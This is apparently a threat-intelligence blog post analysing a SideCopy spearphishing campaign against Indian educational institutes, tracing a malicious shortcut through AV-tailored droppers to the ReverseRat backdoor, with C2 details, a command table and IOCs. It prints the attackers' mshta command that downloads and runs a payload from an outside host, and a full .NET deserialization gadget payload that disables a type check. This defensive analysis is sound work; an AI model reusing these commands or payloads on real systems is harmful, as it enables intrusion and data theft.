---
title: "SideCopy expands their targetting to  educational institutes"
date: 2026-10-08 13:00:30 +0300
categories: [malware analysis, APT]
tags: [Threatintell,malware]
render_with_liquid: false
---

In the late september 2026 , The Pakistani Nexus APT **SideCopy** was observed targeting indian educational institutes with spearphishing lures , Aiming to deliver **Reverse Rat** , a simple , yet effective backdoor written in **VB.NET** .

Those phishing lures delivered a malicious windows shortcut file **.lnk** , and relied on **User Execution** to initiate a multi-stage  infection chain , ranging from **Reflective loading** to .NET **Insecure deserialization** abuse to deliver and persist their final **ReverseRat** payload , which provides the CyberThreat Actors with extensive control over the system . Capabilities Range from command execution , screenshot taking , exfiltration , to stealing intellectual property from any plugged-in **Flash-drive** or **CD ROM** .


**SideCopy** is a Pakistani threat group that has primarily targeted South Asian countries, including Indian and Afghani government personnel, since at least 2019. SideCopy's name comes from its infection chain that tries to mimic that of **Sidewinder**, a suspected Indian threat group . <sup>[[1]](#references)</sup>



In this technical analysis , we will analyze this campaign full infection chain  , dissecting the backdoor **capabilities** , **c2 config** , **infrastucture** , and finshing up with some **IOCs**


## Initial access 

The spearphishing lure delivers a zip archive  containing two files : ``commskll.docx`` and ``com\com.gif`` which is just an arbitrary image .


``commskll.docx`` Is a malicious shortcut file ,  the once clicked  , executes : 

```C:\Windows\System32\mshta.exe "https://docsportal%2Ein/public/reps/com/161%2Ephp" & alpa%2Eexe```

which will effectively download and execute ``alpa.exe`` . 


![Delivered archive contents](/resources/Sidecopy_reverseRat/zipcontents.png)
*Delivered archive contents*

![Malicious link view](/resources/Sidecopy_reverseRat/lnk_file_target.png)
*The Malicious link target*

<br><br>

> Note: The Threat Actor spoofed the icon of the shortcut , to look like a pdf , increasing the chances that the victim will click it . 
{: .prompt-info }

<br>

At the time of analysis  , i was unable to obtain **alpa.exe** binary . It just embeds and reflectively loads next stage dropper **ne4snapk.dll** .


## Stage 1 , AV-customized Dropper

After being reflectively loaded into memory  , it will drop a decoy document to ``%temp%\commskl.docx`` . The document is just a distraction for what is going on in the background .


<br><br>

It will also Check if the internet is available by pinging ``googledns or cloudflare or microsoft`` , and if the internet is available :

- beacon the c2 ``dns.educationportals.biz:5836`` .

- Show the previosuly dropped lure document .

<br>

The document themes a business writing skills guide : 

![lure document overview](/resources/Sidecopy_reverseRat/lure_doc.png)
*commskl.docx contents*



### Fine-tuned behavior ,  Can we Evade the Anti-Virus ?  

By querying ``\\hostname\\root\SecurityCenter2\AntiVirusProduct`` WMI  namspace , It will get a full listing of installed Anti-Virus products (**Discovery , Security Software Discovery**).

<br>
The following AV products are looked-up :

``AVG,Kaspersky,Quick,Avast,AviramBitDefender,WindowsDefender`` 



#### Defense evasion combinations

All dropped files ``appT.bat test.cmd update.Sys `` will launch the same **stager script** ``startT.hta`` , but with different methods :

 - **appT.bat**  : launch it directly using ``mshta.exe``
 
 - **test.cmd** : launch it using ``powershell``

 - **update.Sys** : launch it using  a .lnk 

 - **user02.bat** :Create a **Run** key named **BSH** ,  to launch the **stager** via ``mshta.exe``


Where are these files dropped ?


- **startT.hta** : ``c:\users\public\Users dir`` (created) / Dropped in the ``%startup%`` for certain AV detections .

- **test.cmd** : Dropped in ``%startup%`` of the current user
- **appT.bat** : Dropped in ``c:\users\public\Users`` 
- **Update Sys.lnk** : Dropped in  Dropped in ``%startup%`` of the current user
- **user02.bat** : dropped in ``c:\users\public\Users``

<br><br>
> **Important**<Br>
> **The malwre customizes the dropping behavior based on the Detected AV , to evade defenses stealthily , but how ?**
{: .prompt-warning }

<br>

- Kaspersky :
    drop ``test.cmd`` inside ``%startup%`` (so it will launch the ``startT.hta`` at next boot &rarr; Using powershell)
    - **Execution:powershell**
    - **Persistence : Startup folder , using .cmd that runs a powershell**

- Quickheal : Drop **appT.bat** to it's location . Drop **update Sys.lnk** to it's destination . Drop the **startT.hta** to its' location . Finally , start **appT.bat**

    - **Execution:.bat using mshta**<br>
    - **Persistence: startup , using a .lnk**

- **Avast , Avera and AVG** : copy **startT.hta** to ``%startup%`` directly , then launch it .

    - **Execution and Persitence:By startup folder directly**


- **Bitdefender , Windows defender , or no AV** :
    place **appT.bat** in it's destination . drop **user02.bat** to it's dest . drop **startT.hta** not to startup .
    launch ``appT.bat``

    - **Execution : .bat ,run stage 2 direclty**
    - **Persistence : Run key**
    - **Indicator removal :** The persitence script **user02** is deleted .


>NOTE:<br>
>All previously dropped files and scripts are embedded inside ne4snapk.dll : 
>```base64(CompressedLength<first four bytes>||Gzip(file-content))```<br>
>Then the malware will decode , decompress and drop the payload ( **Obfuscated Files or Information , Compression ).** 
{: .prompt-info }




## Abusing .NET deserialization vulnerabilities 

Ultimately , All dropped payloads are just a *proxy* to execute *startT.hta* :

![stager deserialization payload](/resources/Sidecopy_reverseRat/exploit-arrow.png)


Depicted  with red arrows are the embedded **serialized** objects . The first one , which is triggered using **BinaryFormater.Deserialize** call pointed by the first blue arrow : 

```
\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x0c\x02\x00\x00\x00^Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\x05\x01\x00\x00\x00BMicrosoft.VisualStudio.Text.Formatting.TextFormattingRunProperties\x01\x00\x00\x00\x0fForegroundBrush\x01\x02\x00\x00\x00\x06\x03\x00\x00\x00\xaa\x10
<ResourceDictionary\n
	xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"\n
	xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"\n
	xmlns:s="clr-namespace:System;assembly=mscorlib"\n
	xmlns:c="clr-namespace:System.Configuration;assembly=System.Configuration"\n
	xmlns:r="clr-namespace:System.Reflection;assembly=mscorlib">\n                
	<ObjectDataProvider x:Key="type" ObjectType="{x:Type s:Type}" MethodName="GetType">\n                    
		<ObjectDataProvider.MethodParameters>\n                        
			<s:String>System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35</s:String>\n                    
		</ObjectDataProvider.MethodParameters>\n                
	</ObjectDataProvider>\n                
	<ObjectDataProvider x:Key="field" ObjectInstance="{StaticResource type}" MethodName="GetField">\n                    
		<ObjectDataProvider.MethodParameters>\n                        
			<s:String>disableActivitySurrogateSelectorTypeCheck</s:String>\n                        
			<r:BindingFlags>40</r:BindingFlags>\n                    
		</ObjectDataProvider.MethodParameters>\n                
	</ObjectDataProvider>\n                
	<ObjectDataProvider x:Key="set" ObjectInstance="{StaticResource field}" MethodName="SetValue">\n                    
		<ObjectDataProvider.MethodParameters>\n                        
			<s:Object/>\n                        
			<s:Boolean>true</s:Boolean>\n                    
		</ObjectDataProvider.MethodParameters>\n                
	</ObjectDataProvider>\n                
	<ObjectDataProvider x:Key="setMethod" ObjectInstance="{x:Static c:ConfigurationManager.AppSettings}" MethodName ="Set">\n                    
		<ObjectDataProvider.MethodParameters>\n                        
			<s:String>microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck</s:String>\n                        
			<s:String>true</s:String>\n                    
		</ObjectDataProvider.MethodParameters>\n                
	</ObjectDataProvider>\n            
</ResourceDictionary>\x0
```

The above Serialized object abuses **TextFormattingRunProperties** gadget to access and set  *DisableActivitySurrogateSelectorTypeCheck* property .The *ActivitySurrogateSelectorTypeCheck* which was introduced by microsoft to prevent the un-restricted deserialization of objects with **BinaryFormater** and restrict it to **ActivityBind** and **DependencyObject** .<sup>[[3]](#references)</sup>


By disabling this property , the threat actors effectively stages for Main payload deserializtion (*Depicted above with the second red arrow*) , allowing other classes to be deserialized .

When *ExploitPart2* is deserialized (*depicted with the lower blue arrow*) , the final stage **ioluegnt.dll** will be reflectively loaded using **Assembly.Relfection** class : 


![](/resources/Sidecopy_reverseRat/exploit2-arrow.png)
*The serialized reflective loader payload*

Depicted with the red arrow is the embedded **ioluegnt.dll** payload .Depicted with the blue arrow is the serialized object contents , that when deserialized , will load the dll in memory .


**The following graph summarizes the full infection chain** <sup>[[2]](#references)</sup>

![](/resources/Sidecopy_reverseRat/sidecopy-threat-intel-mshta-rat-deployment-1.jpg)
*Infection chain graph took from Trellix blog*



## Final payload ,  Reverse Rat 

The Rat has  three Main Threads : 

```
Thread thread = new Thread(new ThreadStart(this.DoMainWork)); // backdoor
		thread.Start();
		Thread thread2 = new Thread(new ThreadStart(TestClass.DoUSBWork));//USB watcher
		thread2.Start();
		Thread thread3 = new Thread(new ThreadStart(TestClass.DoCDWork));//CD watcher
		thread3.Start();
		thread3.Join();
		thread2.Join();
		thread.Join();
```


### The Backdoor thread

After 2 secs of running   , the malware will beacon to it's C2 on ``dns.educationportals.biz:5863`` , with the following content :

```NewConnection|IPV4 of all interfaces that is UP |%USERNAME%|Hostname|OsVersion```


The malware will  disable TLS certificate checking  , so even if there cert does not verify , TLS handshake  will still proceed.

>Note <br>
>Using thread pools , The malware will ping the server (As a keep-alive beacon) every 30-60 secs with "PingServer" as payload .
{: .prompt-info }



**Structure of recieved data:**

```first-4-bytes(length of recieved)|| AES-enc(recieved data)```


**Structure of pased data**:

```Aes-encrypt(collected data in response to one,same Aes Key)```


All Recieved and sent data is encrypted using AES128-CBC , with the following hardcoded key : ``MD5(NMXIKS09?:709,!~lnsYUS)``


#### backdoor supported commands

After initiating the beacon , the malware will start recieving encrypted commands , execute them , then send back the result : 

| Command                | What is done                                                                                                                                                                                                                                                                                                  | Result passed                                                                                                                                                                                                                                                                                                                                                            |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `Disconnected`         | Just close the C2 connection                                                                                                                                                                                                                                                                                  | **Nothing back**                                                                                                                                                                                                                                                                                                                                                         |
| `SystemInformation`    | Local system information discovery, including video drivers, available memory, OS version, etc.                                                                                                                                                                                                               | `SystemInformation\|COMPUTERNAME\|USERNAME\|ScreenHeight\|ScreenWidth\|AvailablePhysicalMem\|AvailableVirtualMemor\|OSFullName\|OsPlatform\|OsVersion\|TotalPhysicalMemory\|TotalVirtualMemory\|BatteryChargingornot\|StartupTime\|uptime(days,weeks,hours,secs)\|<Video Capture Driver Names>\|Unkown\|Unkown\|\|Mac Addr of first interface\|NO\|N/A\|Executable path` |
| `pkill`                | Kill a certain process by PID                                                                                                                                                                                                                                                                                 | `ProcessManager\|Listing of the following info for all processes(processname{-pi}procid{-pi}process executable description)`                                                                                                                                                                                                                                             |
| `ProcessManager`       | Get the same previous process listing, but without process killing                                                                                                                                                                                                                                            | `ProcessManager\|Listing of the following info for all processes(processname{-pi}procid{-pi}process executable description)`                                                                                                                                                                                                                                             |
| `Software`             | Get a list of all installed software from the `Uninstall` key                                                                                                                                                                                                                                                 | `InstalledSoftware\|Displayname for each installed software`                                                                                                                                                                                                                                                                                                             |
| `Passwords`            | This command is deprecated in this build of the malware. It was supposed to steal browser credentials.                                                                                                                                                                                                        | `Unable to get Browser Credentials in Windows 11\n Use another HTA file.`                                                                                                                                                                                                                                                                                                |
| Starts with `RD`       | Take a screenshot, encode it as JPEG, and send it base64-encoded to the C2                                                                                                                                                                                                                                    | `RemoteDesktop:base64(screen-shot in jpeg)`                                                                                                                                                                                                                                                                                                                              |
| `GetPcBounds`          | Get screen height and width                                                                                                                                                                                                                                                                                   | `PcBounds<Height X Width>`                                                                                                                                                                                                                                                                                                                                               |
| `contains(SetCursPos)` | Generate mouse movement to the specified (x,y) , then right/left click according to what is passed                                                                                                                                                                                                            | **Nothing back**                                                                                                                                                                                                                                                                                                                                                         |
| `GetHostsFile`         | Read the hosts file at `C:\Windows\system32\drivers\etc\hosts`                                                                                                                                                                                                                                                | `Hosts<contents of hosts file>`                                                                                                                                                                                                                                                                                                                                          |
| `UpdateHostsFile`      | Update the hosts file with attacker-controlled data                                                                                                                                                                                                                                                           | **Nothing back**                                                                                                                                                                                                                                                                                                                                                         |
| `GetCpText`            | Start a separate thread for collecting clipboard data, continuously collecting and sending results                                                                                                                                                                                                            | `CpText<collected clipboard over and over>`                                                                                                                                                                                                                                                                                                                              |
| `SaveCpText`           | Start a separate thread for changing clipboard data                                                                                                                                                                                                                                                           | **Nothing back**                                                                                                                                                                                                                                                                                                                                                         |
| `Shell`                | Execute the passed command using `cmd /c <passed>` and send back execution results                                                                                                                                                                                                                            | `Shell<command execution results>`                                                                                                                                                                                                                                                                                                                                       |
| `ListDrives`           | List all drive names in the system                                                                                                                                                                                                                                                                            | `Drives<All file-system drive names>`                                                                                                                                                                                                                                                                                                                                    |
| `ListFiles`            | List all files/directories in the passed path                                                                                                                                                                                                                                                                 | `Name\|\|CreationTime\|\|LastAccessTime\|\|<"" for dirs> <Size in kb for files>\|\|<1 for dir><0 for file>`                                                                                                                                                                                                                                                              |
| `mkdir`                | Create a directory according to the passed path                                                                                                                                                                                                                                                               | **Nothing back**                                                                                                                                                                                                                                                                                                                                                         |
| `rmdir`                | Delete the directory at the passed path                                                                                                                                                                                                                                                                       | **Nothing back**                                                                                                                                                                                                                                                                                                                                                         |
| `rnfolder`             | Rename a directory using `oldname\|newname`                                                                                                                                                                                                                                                                   | **Nothing back**                                                                                                                                                                                                                                                                                                                                                         |
| `mvdir`                | Move a directory using `oldlocation\|newlocation`                                                                                                                                                                                                                                                             | **Nothing back**                                                                                                                                                                                                                                                                                                                                                         |
| `rmfile`               | Permanently delete the file at the specified path, rather than moving it to the Recycle Bin                                                                                                                                                                                                                   | **Nothing back**                                                                                                                                                                                                                                                                                                                                                         |
| `rnfile`               | Rename a file using `oldname\|newname`                                                                                                                                                                                                                                                                        | **Nothing back**                                                                                                                                                                                                                                                                                                                                                         |
| `ShareFile`            | Exfiltrate a file from the passed path                                                                                                                                                                                                                                                                        | `IncomingFile<target file base64 encoded>`                                                                                                                                                                                                                                                                                                                               |
| `run`                  | Run the executable at the specified path ; the file will be dropped before execution                                                                                                                                                                                                                          | **Nothing back**                                                                                                                                                                                                                                                                                                                                                         |
| `Execute`              | Terminate previously dropped malware processes and delete their files &rarr;  Move the newly dropped encrypted file to replace this malware &rarr; decrypt and execute it &rarr; check whether the new malware successfully connected to its C2 &rarr; and send back the results of all installed AV products | `ExecuteFileFile Copied To { " + uploadPath + "} ...\n o success of copy` and `ExecuteFileDLL File downloaded and placed {" + fullName + "}...\n on success of execution`, plus `<netstat line of the malware connection>` if successfully connected to its C2, and `InstalledAV<list of all installed AV products>`. On error: `ExecuteFile Error:`                     |
| `AddSys`               | Receives `addSys\|<start or reg>\|target-file-name\|file-data-compressed`. For `reg`, decompresses and drops to `%public%`, then executes it, maintaining persistence through the registry. For `start`, decompresses and drops to `%startup%\passed_name` , maintaining persistence through Startup          | `ExecuteFilePresistance: Registry Entry Created` for `reg`, or `ExecuteFilePresistance: Start Up File Created` for `start`                                                                                                                                                                                                                                               |
| `fileupload`           | Ingress tool transfer that drops the file at once, or in chunks if large enough (`>677659`), to the specified path                                                                                                                                                                                            | **Nothing back**                                                                                                                                                                                                                                                                                                                                                         |



**Some Thoughts on backdoor commands:**


- The mix of screenshot taking ability with mouse movements , means that the threatActors can **primitvely** navigate around using the GUI .

- It is worthnoting that the clipboard watcher  , keeps sending the clipboard traffic over and over , which will create  a huge spike in the network traffic (Other threat actors will usually calculate a hash for the clipboard  ,  and if the hash changed , then the clipboard content changed , so they exfiltrate it).

- The focus on data **collection** from peripheral storage device  , shows that the TA are determined on collecting the largest amount of **Intelligence** possible .

- The type of files targeted y threat actors (.pdf,.xlsx,.doc,.accdb....) aligns perfectly with **Advanced Persistent Threat** usuall intent , which is espionage and intellectual property theft .

- The backdoor have three unsued commands `` RecorrdingStart , RecordingStop , RecordingDownload`` , which hints that the malware might also be designed to do video screen-captures . 

- The capability of changing the hosts-file contents , means that the adversary can inject a malicious mapping between a commonly used website by the victim (like facebook,twitter) and their malicious copycat sites , achieving **DNS poisoning** .
*For example*  , the follwoing entry ```<aversary controlledip> facebook.com``` will redirect the victim to the attacker malicious site , whenver they visist facebook.


### DoUSBWork thread 

staging dir used: ``C:\\ProgramData\\SDS\\``


By subscribing to Every **__InstanceCreationEvent** in WMI on ``Win32_usbHub`` , It will execute the following whenver any **USB** is plugged :

For the root of the drive , create a directory for each targeted extension , and store compatible files under it:

``C:\\ProgramData\\SDS\\Root\.ext<.xls,.xlsx,.doc,.docx,.ppt,.pptx,.txt,.pdf,.mdb,.aacdb>\All found files of this extension``

After finishing root , it will **Recursively** search for the same files in any dir in the **Plugged usb** :

Steal the files to :
``C:\\ProgramData\\SDS\\SubDir\.ext<.xls,.xlsx,.doc,.docx,.ppt,.pptx,.txt,.pdf,.mdb,.aacdb>\All found files of this extension``


### DoCd thread

staging dir: ``C:\\ProgramData\\SDS\\CD <CD drivename>``


For CDs detected before the **Watcher** starts :

copy the entire CD file system to ``dir:C:\\ProgramData\\SDS\\CD\\<Cd drivename>\\``

THen start a WMI Event watcher , so , for every new **CDRom** That is attached , we will steal it's entire filesystem to :  ``dir:C:\\ProgramData\\SDS\\CD\\<Cd drivename>\\``


If the watcher failed , keep polling **manually every 30 secs** for new CD attaches



## Victimology 

This campaign mainly targeted educational institutions across India . This highlights that **SideCopy** is expanding it's targetbase from  surveillance and exfiltration of sensitive data from government officials and high-ranking personnel , to academic institutions .


## Infrastructure 


| Domain                     | Registrar     | Associated IP     | ASN                                         |
| -------------------------- | ------------- | ----------------- | ------------------------------------------- |
| `dns.educationportals.biz` | NAMECHEAP INC | `172.86.89.187`   | AS14956 (a known bulletproof host)          |
| `docsportal.in`            | NAMECHEAP INC | `199.188.200.114` | AS22612 (also a notorious bulletproof host) |

## IOCs 

### Host based IOCs

Path ``%public%\User``  , which will contain ``startT.hta`` , which is the stager for stage2 .

**Importance :**This is the file that activates **disableActivitySurrogateSelectorTypeCheck** to be able to load stage2 by **insecure deserialization** .



Path  ``C:\\ProgramData\\SDS`` , which is the staging directory of the stolen files and CD contents , it will contains three sub-dirs :

- ``\Root`` :  which contains files stolen from the root of the detected Flash-drive .
- ``\SubDir\`` : which contains files stolen from any directory in the detected Flash-drive .
- ``\CD\CD-drive-name`` : Which contains A full copy of the detected CD (**Intellectual property theft**)


Files ``test.cmd and Update Sys.lnk`` under the user  ``StartupFile`` , which points to **startT.hta** under ``%public%\User``

**Importance :** Those ensure persistence for the backdoor stager.



A registry **Run** Key with name ``BSH`` , that executes the following : ``mshta.exe c:\users\public\User\startT.hta`` .


### Network based IOCs

Outbound SSL encrypted communications with ``dns.educationportals.biz`` (which resolves to 172.86.89.187) on port ``5863`` .

**Importance :** This is the primary C2 channel , used to send-commands to the backdoor , and exfiltrate back results .


Anamulous pings to ``googledns or cloudflare or microsoft`` from  ``mshta.exe`` ,which are used to check internet reachability .



## File hashes 

| File                | SHA-256                                                            | Description                                                            |
| ------------------- | ------------------------------------------------------------------ | ---------------------------------------------------------------------- |
| `commskll.docx.lnk` | `79069184EBA010036A8C01E5E6F4FEC026E34C3E1A5412FDC72307813D93FF3E` | Malicious infection starts via shortcut                                |
| `ne4snapk.dll`      | `ac340859805220f97f98b299b32d82b1ccbb2c04c8c09516f3937feda937af80` | Customized dropping for each AV                                        |
| `commskl.docx`      | `07d2479094825fa121f6ca064a94560306c96eb57f30d3dc364c474094d8d8e3` | Lure document shown to the victim student as a technical-writing guide |
| `Update Sys.lnk`    | `B6FB75A20C77F90A0A65278CBF9C287DEE20C0FCE130EA39C42567F10E36BC65` | Maintains persistence through a `.lnk` file                            |
| `appT.bat`          | `8435ec938ca225c3131a624715832845ad9adc5faa93488486bc19c094b4d3ec` | Launches `startT.hta` directly                                         |
| `user02.bat`        | `5c2cf231b101112140d011950b3cf4bca8cdae5e122668eeb73a19f2f85601d9` | Maintains persistence through the **Run** registry key                 |
| `test.cmd`          | `92292387de8622fbaef392794f781f1ddab0957148ebaf82fe68f0a9e5dbd172` | Executes `startT.hta` using **PowerShell**                             |
| `startT.hta`        | `a5e36cf05bcc9ac4e9ebf2a13f95aef8e3847086fe7340c36d6aba6616ae1174` | Executes Stage 2 through insecure deserialization                      |
| `ioluegnt.dll`      | `9d0de13ee0b386423a1040a4d43e541863ebc264f7598a6668a667d5d3c550e0` | Reverse RAT main payload                                               |


<br><br>
I have written A YARA Rule that aims to detect **reverse rat** and it's associated  artefacts : [YARA rule](https://github.com/husa45/Malware-analysis/blob/main/YaraRules/SideCopyTargettingAcedemicInstitutionsCampaign-late-sep-2026.YARA)


## References<a name="headin"></a>

 - [1]  [MITRE ATT&CK , SideCopy group ](https://attack.mitre.org/groups/G1008/)
-  [2]  [SideCopy Threat Intel: MSHTA-driven Execution and RAT Deployment](https://www.trellix.com/blogs/research/sidecopy-threat-intel-mshta-execution-rat-deployment/)
-  [3] [Re-Animating ActivitySurrogateSelector](https://www.netspi.com/blog/technical-blog/red-teaming/re-animating-activitysurrogateselector/)